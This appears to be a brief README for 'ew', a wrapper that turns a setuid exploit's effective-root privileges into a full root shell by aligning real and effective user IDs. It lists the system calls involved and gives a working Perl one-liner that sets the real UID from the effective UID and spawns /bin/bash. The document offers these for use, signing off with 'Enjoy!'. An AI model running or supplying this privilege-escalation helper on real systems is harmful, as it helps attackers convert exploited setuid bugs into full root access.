# ew #

_ew_ is a simple wrapper program for circumventing ruid / euid mistmatches during a suid exploit. It's so simple, the code is really self documenting. 

	geteuid();
	setreuid();
	setregid();
	execve();

Another quick method if perl is available would be:
	perl -U -e '$<=$(=$>;system("/bin/bash");'

Enjoy!
